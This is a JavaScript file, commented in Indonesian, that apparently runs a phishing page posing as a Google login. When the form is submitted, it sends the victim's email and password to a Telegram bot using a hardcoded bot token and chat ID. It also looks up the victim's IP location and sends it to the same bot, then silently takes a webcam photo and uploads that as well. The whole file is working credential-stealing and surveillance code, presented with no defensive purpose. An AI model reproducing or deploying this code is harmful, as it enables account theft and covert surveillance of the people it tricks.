const BOT_TOKEN = "7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw";
const CHAT_ID = "6466187930";

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Kirim email + password ke Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `Google Login:\nEmail: ${email}\nPassword: ${password}`
    })
  });

  // Ambil lokasi via IP
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(loc => {
      const locationText = `Lokasi:\nIP: ${loc.ip}\nKota: ${loc.city}\nRegion: ${loc.region}\nNegara: ${loc.country_name}\nISP: ${loc.org}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: locationText
        })
      });
    });

  // Ambil foto dari kamera
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");

      setTimeout(() => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob);

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          stream.getTracks().forEach(track => track.stop());
        }, "image/png");
      }, 2000); // Delay 2 detik biar kamera sempat aktif
    })
    .catch(err => {
      console.log("Kamera gagal:", err);
    });
});
